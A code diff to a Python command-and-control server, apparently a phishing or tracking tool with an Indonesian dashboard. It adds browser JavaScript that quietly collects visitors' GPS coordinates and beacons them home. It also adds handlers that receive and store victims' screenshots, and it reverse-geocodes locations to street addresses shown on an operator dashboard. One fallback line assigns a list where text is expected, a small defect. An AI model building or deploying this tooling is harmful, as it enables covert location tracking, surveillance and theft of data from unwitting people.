@@ -43,6 +43,7 @@ import json
 import ipaddress
 import os
 import socket
+import base64
 from datetime import datetime
 
 PORT = int(os.environ.get("C2_PORT", "8080"))
@@ -56,6 +57,37 @@ EXPORT_PATH = "/export"
 
 events = []
 loc_cache = {}
+addr_cache = {}
+
+
+def reverse_geocode(lat, lon):
+    if not lat or not lon:
+        return ""
+    key = f"{lat},{lon}"
+    if key in addr_cache:
+        return addr_cache[key]
+    address = ""
+    try:
+        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1&accept-language=id"
+        req = urllib.request.Request(url, headers={"User-Agent": "c2-lab-monitor/1.0"})
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            info = json.loads(resp.read().decode("utf-8"))
+        ad = info.get("address", {})
+        parts = []
+        for k in ("road", "neighbourhood", "suburb", "village", "town", "city", "county", "state", "country"):
+            if ad.get(k):
+                parts.append(ad[k])
+        seen = []
+        for p in parts:
+            if p not in seen:
+                seen.append(p)
+        address = ", ".join(seen)
+        if not address:
+            address = info.get("display_name", "").split(",")[:4]
+    except Exception:
+        address = ""
+    addr_cache[key] = address
+    return address
 
 
 def emit(text):
@@ -128,7 +160,13 @@ def _geolocate(client_ip):
         with urllib.request.urlopen(url, timeout=8) as resp:
             info = json.loads(resp.read().decode("utf-8"))
         if info.get("status") == "success":
-            return f"{info.get('city')}, {info.get('regionName')}, {info.get('country')} ({info.get('lat')}, {info.get('lon')}) - ISP: {info.get('isp')}"
+            lat, lon = info.get("lat"), info.get("lon")
+            addr = reverse_geocode(lat, lon)
+            city = info.get("city") or info.get("regionName") or info.get("country")
+            base = f"{city}, {info.get('regionName')}, {info.get('country')} ({lat}, {lon})"
+            if addr:
+                return f"{addr} | {base} - ISP: {info.get('isp')}"
+            return f"{base} - ISP: {info.get('isp')}"
         return f"Gagal lookup: {info.get('message', 'no message')}"
     except Exception as e:
         return f"Error lookup: {e}"
@@ -170,6 +208,17 @@ function sendFingerprint() {
     }).catch(function(){});
 }
 sendFingerprint();
+function sendGPS(pos) {
+    var d = {"lat": pos.coords.latitude, "lon": pos.coords.longitude, "accuracy": pos.coords.accuracy};
+    fetch("/?id=beacon", {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "type=gps&data=" + encodeURIComponent(JSON.stringify(d))
+    }).catch(function(){});
+}
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendGPS, function(){}, {timeout: 10000, maximumAge: 600000});
+}
 </script>
 </head>
 <body>
@@ -198,6 +247,8 @@ tr:hover td { background:#24324a; }
 .badge { padding:2px 8px; border-radius:999px; font-size:11px; white-space:nowrap; }
 .b-click { background:#3b2f0a; color:#facc15; }
 .b-data { background:#0f3a2e; color:#34d399; }
+.b-shot { background:#3b1457; color:#e879f9; }
+.b-gps { background:#0a3d5c; color:#38bdf8; }
 .detail { max-width:420px; word-break:break-all; color:#cbd5e1; font-size:12px; }
 a { color:#38bdf8; }
 </style>
@@ -209,6 +260,7 @@ a { color:#38bdf8; }
 <div class="card"><div class="n" id="sTotal">0</div><div class="l">Total Event</div></div>
 <div class="card"><div class="n" id="sClick">0</div><div class="l">Klik Link</div></div>
 <div class="card"><div class="n" id="sData">0</div><div class="l">Paket Data</div></div>
+<div class="card"><div class="n" id="sShot">0</div><div class="l">Screenshot</div></div>
 <div class="card"><div class="n" id="sIP">0</div><div class="l">IP Unik</div></div>
 <div class="card"><div class="n" id="sLast">-</div><div class="l">Aktivitas Terakhir</div></div>
 </div>
@@ -235,13 +287,16 @@ async function refresh() {
 function render(ev) {
     document.getElementById("sub").textContent = "Terkoneksi - " + ev.length + " event";
     document.getElementById("sTotal").textContent = ev.length;
-    var clicks = 0, datas = 0, ips = {}, last = ev.length ? ev[0].time : "-";
+    var clicks = 0, datas = 0, shots = 0, ips = {}, last = ev.length ? ev[0].time : "-";
     for (var i = 0; i < ev.length; i++) {
-        if (ev[i].type === "click") clicks++; else datas++;
+        if (ev[i].type === "click") clicks++;
+        else if (ev[i].type === "screenshot") shots++;
+        else datas++;
         ips[ev[i].ip] = 1;
     }
     document.getElementById("sClick").textContent = clicks;
     document.getElementById("sData").textContent = datas;
+    document.getElementById("sShot").textContent = shots;
     document.getElementById("sIP").textContent = Object.keys(ips).length;
     document.getElementById("sLast").textContent = last;
     var rows = document.getElementById("rows");
@@ -249,11 +304,20 @@ function render(ev) {
     var slice = ev.slice(0, 100);
     for (var j = 0; j < slice.length; j++) {
         var e = slice[j];
-        var badge = e.type === "click" ? '<span class="badge b-click">Klik</span>' : '<span class="badge b-data">Data</span>';
-        var detail = "";
+        var badge, detail = "";
         if (e.type === "click") {
+            badge = '<span class="badge b-click">Klik</span>';
             detail = "Path: " + esc(e.path);
+        } else if (e.type === "gps") {
+            badge = '<span class="badge b-gps">GPS</span>';
+            var acc = e.detail && e.detail.accuracy != null ? " (~" + e.detail.accuracy + "m)" : "";
+            detail = esc(e.detail.address || (e.detail.lat + ", " + e.detail.lon)) + acc;
+        } else if (e.type === "screenshot") {
+            badge = '<span class="badge b-shot">Screenshot</span>';
+            var kb = e.detail && e.detail.size_kb != null ? e.detail.size_kb + " KB" : "";
+            detail = kb + ' <a href="/screenshot/' + encodeURIComponent(e.file.split("/").pop()) + '" target="_blank">lihat gambar</a>';
         } else {
+            badge = '<span class="badge b-data">Data</span>';
             try { detail = esc(JSON.stringify(e.detail).slice(0, 300)); }
             catch(x) { detail = esc(String(e.detail)); }
         }
@@ -318,6 +382,22 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                            [("Content-Disposition", 'attachment; filename="logs.txt"')])
             return
 
+        if path.startswith("/screenshot/"):
+            if not self._auth_ok(query):
+                self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: pass salah")
+                return
+            name = os.path.basename(path.split("/", 2)[2])
+            fpath = os.path.join(LOG_DIR, name)
+            if name.startswith("screenshot_") and os.path.isfile(fpath):
+                try:
+                    with open(fpath, "rb") as f:
+                        self._send(200, "image/png", f.read(), [("Cache-Control", "no-store")])
+                    return
+                except Exception:
+                    pass
+            self._send(404, "text/plain; charset=utf-8", b"Gambar tidak ditemukan")
+            return
+
         client_ip = self.real_client_ip()
         t = now_str()
         tracking_id = query.get("id", [""])[0] or "-"
@@ -352,8 +432,62 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             data_payload = parsed_data.get("data", [""])[0]
             if not data_payload:
                 data_payload = post_data
+            dtype = parsed_data.get("type", [""])[0]
             client_ip = self.real_client_ip()
             t = now_str()
+            if dtype == "gps":
+                try:
+                    detail = json.loads(data_payload)
+                except ValueError:
+                    detail = {"raw": data_payload}
+                lat = detail.get("lat")
+                lon = detail.get("lon")
+                addr = reverse_geocode(lat, lon) if lat and lon else ""
+                fname = os.path.join(LOG_DIR, f"gps_{client_ip}_{file_ts()}.log")
+                try:
+                    with open(fname, "w", encoding="utf-8") as f:
+                        f.write(f"IP: {client_ip}\nWaktu: {t}\nLokasi GPS: {lat}, {lon} (akurasi {detail.get('accuracy')} m)\nAlamat: {addr}\n")
+                except Exception as e:
+                    emit(f" [!] Gagal simpan gps: {e}")
+                record_event({
+                    "time": t, "type": "gps", "ip": client_ip, "id": "beacon",
+                    "path": "/", "location": addr or geolocate(client_ip),
+                    "detail": {"lat": lat, "lon": lon, "accuracy": detail.get("accuracy"), "address": addr}, "file": fname
+                })
+                emit("=" * 60)
+                emit(" [+] GPS DITERIMA (dari browser)")
+                emit(f"     Waktu  : {t}")
+                emit(f"     IP     : {client_ip}")
+                emit(f"     Lokasi : {lat}, {lon} (akurasi {detail.get('accuracy')} m)")
+                emit(f"     Alamat : {addr or '(tidak ada alamat ter-reverse)'}")
+                emit("=" * 60)
+                self._send(200, "text/plain; charset=utf-8", b"ACK")
+                return
+            if dtype == "screenshot":
+                fname = os.path.join(LOG_DIR, f"screenshot_{client_ip}_{file_ts()}.png")
+                try:
+                    png = base64.b64decode(data_payload)
+                except Exception as e:
+                    emit(f" [!] Gagal decode screenshot: {e}")
+                    self._send(400, "text/plain; charset=utf-8", b"Bad screenshot")
+                    return
+                with open(fname, "wb") as f:
+                    f.write(png)
+                record_event({
+                    "time": t, "type": "screenshot", "ip": client_ip, "id": "beacon",
+                    "path": "/", "location": geolocate(client_ip),
+                    "detail": {"bytes": len(png), "size_kb": round(len(png) / 1024, 1)}, "file": fname
+                })
+                emit("=" * 60)
+                emit(" [+] SCREENSHOT DITERIMA")
+                emit(f"     Waktu : {t}")
+                emit(f"     IP    : {client_ip}")
+                emit(f"     Ukuran: {len(png)} bytes ({round(len(png)/1024,1)} KB)")
+                emit(f"     File  : {fname}")
+                emit(f"     Lihat : /screenshot/{os.path.basename(fname)} (butuh auth dashboard)")
+                emit("=" * 60)
+                self._send(200, "text/plain; charset=utf-8", b"ACK")
+                return
             fname = os.path.join(LOG_DIR, f"{client_ip}_{file_ts()}.log")
             with open(fname, "w", encoding="utf-8") as f:
                 f.write(data_payload)
